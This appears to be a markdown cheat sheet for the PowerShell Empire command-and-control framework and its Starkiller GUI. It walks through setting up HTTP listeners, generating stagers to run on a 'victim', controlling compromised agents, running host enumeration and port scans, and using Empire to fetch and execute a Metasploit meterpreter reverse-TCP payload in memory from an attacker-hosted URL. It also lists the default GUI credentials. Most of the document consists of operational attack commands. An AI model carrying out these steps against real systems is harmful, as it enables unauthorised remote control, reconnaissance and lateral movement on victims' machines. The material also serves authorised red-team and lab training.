
> [!abstract] PowerShell Empire & Starkiller Cheat Sheet
> A comprehensive guide for PowerShell Empire (Backend) and Starkiller (GUI). Covers installation, listener/stager creation, agent interaction, network enumeration, and Metasploit integration.
> **MITRE ATT&CK Mapping:** [TA0011 Command and Control](https://attack.mitre.org/tactics/TA0011/)

## Installation & Setup

> [!info]+ Installation
> ```bash
> sudo apt update && sudo apt install powershell-empire starkiller -y
> ```

> [!tip]+ Starting the Server & Client
> The Empire architecture is split into a backend Server and a frontend Client (CLI or GUI).
> 
> **Step 1: Start the Server (Backend)**
> This manages the listeners and agents.
> ```bash
> sudo powershell-empire server
> # Wait for the "Server >" prompt
> ```
> 
> **Step 2: Start the Client (CLI)**
> ```bash
> sudo powershell-empire client
> # Wait for the "(Empire) >" prompt
> ```

> [!example]+ Accessing the GUI (Starkiller)
> 1. Open Starkiller from the start menu or run `starkiller`.
> 2. Login with default credentials:
>    - **User:** `empireadmin`
>    - **Pass:** `password123`
> 
> **GUI Workflow:**
> 1. **Set up Listener:** Create an `http` listener.
> 2. **Set up Stager:** Choose `windows/Csharp_exe` (Set your IP where the victim will send requests).
> 3. **Download Stager:** Download the generated executable.
> 4. **Execute:** Drop the stager onto the target machine and run it.

---

## CLI Workflow: Listeners & Stagers

> [!danger]+ 1. Setting up HTTP Listener
> ```text
> (Empire) > uselistener http
> (Empire: uselistener/http) > set Host 0.0.0.0
> (Empire: uselistener/http) > set Port 80
> (Empire: uselistener/http) > execute
> 
> # Verify listener is running
> (Empire: uselistener/http) > listeners
> 
> # Return to main menu
> (Empire: uselistener/http) > main
> ```

> [!bug]+ 2. Generating a Stager
> ```text
> (Empire) > usestager multi/launcher
> (Empire: usestager/multi/launcher) > set listener http
> (Empire: usestager/multi/launcher) > execute
> # Copy the generated PowerShell code and run it in the target's CMD
> 
> (Empire: usestager/multi/launcher) > agents
> ```

---

## Agent Interaction & Execution

> [!success]+ Managing Agents
> Once a stager runs on the victim, an Agent checks in.
> 
> ```text
> (Empire) > agents                   # Show active agents
> (Empire) > interact <agentname>     # Interact with a specific agent
> (Empire: <agentname>) > help        # Show available commands
> (Empire: <agentname>) > ipconfig    # Run basic system commands
> ```
> 
> **Shell & Rename Commands:**
> ```text
> (Empire: agents) > help
> (Empire: agents) > rename vxfsfa sindadhost  # Rename an agent
> (Empire: agents) > interact sindadhost
> (Empire: sindadhost) > help
> (Empire: sindadhost) > shell "whoami"         # Run standard cmd commands
> (Empire: sindadhost) > shell "hostname"
> (Empire: sindadhost) > shell "ipconfig"
> ```

---

## Post-Exploitation & Enumeration

> [!warning]+ Situational Awareness Modules
> Empire uses PowerShell modules for enumeration. (Note: `situational_awareness` is a key PowerShell module category).
> 
> **Host Enumeration:**
> ```text
> (Empire: sindadhost) > usemodule powershell/situational_awareness/host/computerdetails
> (Empire: powershell/situational_awareness/host/computerdetails) > options
> (Empire: powershell/situational_awareness/host/computerdetails) > info
> (Empire: powershell/situational_awareness/host/computerdetails) > set Agent sindadhost
> (Empire: powershell/situational_awareness/host/computerdetails) > execute
> (Empire: powershell/situational_awareness/host/computerdetails) > back
> ```
> 
> **Network Port Scan:**
> ```text
> (Empire: sindadhost) > usemodule powershell/situational_awareness/network/portscan
> (Empire: powershell/situational_awareness/network/portscan) > set Hosts 172.20.30.1
> (Empire: powershell/situational_awareness/network/portscan) > set Agent sindadhost
> (Empire: powershell/situational_awareness/network/portscan) > execute
> ```

---

## Metasploit Integration

> [!example]+ Pivoting from Empire to Metasploit
> You can use Empire to deliver a Metasploit payload directly into memory.
> 
> **Step 1: Setup Metasploit Web Delivery**
> ```bash
> msfconsole -q
> ```
> ```ruby
> msf6 > search web_delivery
> msf6 > use exploit/multi/script/web_delivery
> msf6 > set Target 2
> msf6 > set SRVHOST 0.0.0.0
> msf6 > set LHOST <Your_Kali_IP>
> msf6 > set payload windows/meterpreter/reverse_tcp
> msf6 > exploit -j
> # Copy the generated URL (e.g., http://<IP>:8080/...)
> ```
> 
> **Step 2: Execute via Empire Agent**
> ```text
> (Empire: agents) > interact sindadhost
> (Empire: sindadhost) > usemodule powershell/code_execution/invoke_metasploitpayload
> (Empire: powershell/code_execution/invoke_metasploitpayload) > set URL <URL_from_Metasploit>
> (Empire: powershell/code_execution/invoke_metasploitpayload) > set Agent sindadhost
> (Empire: powershell/code_execution/invoke_metasploitpayload) > execute
> ```

---

> [!quote] Resources
> - **Empire Wiki:** [bc-security.gitbook.io/empire-wiki](https://bc-security.gitbook.io/empire-wiki)
> - **GitHub:** [BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)

